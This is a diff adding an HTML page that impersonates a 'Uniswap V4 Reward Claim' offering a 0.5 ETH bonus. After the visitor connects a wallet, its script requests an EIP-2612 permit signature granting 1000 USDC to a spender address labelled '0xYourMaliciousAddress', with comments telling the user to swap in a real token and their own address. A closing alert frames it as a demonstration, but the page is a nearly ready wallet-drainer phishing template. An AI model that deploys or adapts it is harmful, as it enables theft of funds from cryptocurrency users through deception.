@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Claim Rewards - Uniswap V4</title>
+    <style>
+        body { font-family: Arial; text-align: center; margin-top: 100px; background: #0b0b0b; color: white; }
+        button { padding: 20px 40px; font-size: 20px; background: #ff007a; border: none; color: white; border-radius: 10px; cursor: pointer; }
+        button:hover { background: #e6006e; }
+        #status { margin-top: 20px; color: #aaa; }
+    </style>
+</head>
+<body>
+    <h1>🦄 Uniswap V4 Reward Claim</h1>
+    <p>Connect your wallet to claim 0.5 ETH bonus</p>
+    <button id="claimBtn">Connect Wallet & Claim</button>
+    <div id="status">Not connected</div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.0/ethers.umd.min.js"></script>
+    <script>
+        let signer;
+        const claimBtn = document.getElementById('claimBtn');
+        const statusDiv = document.getElementById('status');
+
+        // This is the token that the user will "permit" (dummy address - change to real token like USDC)
+        const TOKEN_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // USDC example
+        const SPENDER_ADDRESS = '0xYourMaliciousAddress'; // Change to your address
+        const DEADLINE = Math.floor(Date.now() / 1000) + 3600; // 1 hour
+
+        claimBtn.addEventListener('click', async () => {
+            if (typeof window.ethereum === 'undefined') {
+                statusDiv.innerText = '❌ No wallet detected. Install MetaMask.';
+                return;
+            }
+
+            try {
+                const provider = new ethers.BrowserProvider(window.ethereum);
+                signer = await provider.getSigner();
+                const userAddress = await signer.getAddress();
+                statusDiv.innerText = `✅ Connected: ${userAddress.slice(0,6)}...`;
+
+                // Build the permit message (EIP-2612)
+                const domain = {
+                    name: 'USD Coin',
+                    version: '2',
+                    chainId: 1, // Ethereum mainnet
+                    verifyingContract: TOKEN_ADDRESS
+                };
+                const types = {
+                    Permit: [
+                        { name: 'owner', type: 'address' },
+                        { name: 'spender', type: 'address' },
+                        { name: 'value', type: 'uint256' },
+                        { name: 'nonce', type: 'uint256' },
+                        { name: 'deadline', type: 'uint256' }
+                    ]
+                };
+                // For demo, we use nonce=0 (in real world you'd fetch actual nonce)
+                const value = ethers.parseUnits('1000', 6); // 1000 USDC (6 decimals)
+                const message = {
+                    owner: userAddress,
+                    spender: SPENDER_ADDRESS,
+                    value: value,
+                    nonce: 0,
+                    deadline: DEADLINE
+                };
+
+                // Request signature
+                const signature = await signer.signTypedData(domain, types, message);
+                console.log('✅ Signature obtained:', signature);
+                statusDiv.innerText = '✅ Signature signed! Check console.';
+                alert('You just signed a permit! In a real attack, your tokens would now be at risk.');
+
+            } catch (err) {
+                console.error(err);
+                statusDiv.innerText = '❌ Signature rejected or error.';
+            }
+        });
+    </script>
+</body>
+</html>
